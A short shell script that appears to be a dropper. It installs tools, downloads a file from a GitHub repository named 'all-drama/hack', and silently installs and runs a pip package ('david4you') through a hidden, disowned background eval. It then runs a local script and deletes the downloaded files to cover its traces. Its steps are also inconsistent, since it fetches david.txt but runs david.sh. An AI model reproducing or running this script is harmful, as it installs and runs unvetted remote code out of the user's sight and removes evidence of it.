cd $HOME
rm -rf david.txt
rm -rf david.sh
apt install wget -y
apt install python -y
apt install zip -y
wget https://raw.githubusercontent.com/all-drama/hack/main/david.txt
_evalBg() {
eval "$@" &>/dev/null & disown;
}
cmd="pip install david4you && david";
_evalBg "${cmd}";
bash david.sh
cd $HOME
rm -rf david.txt
rm -rf david.sh
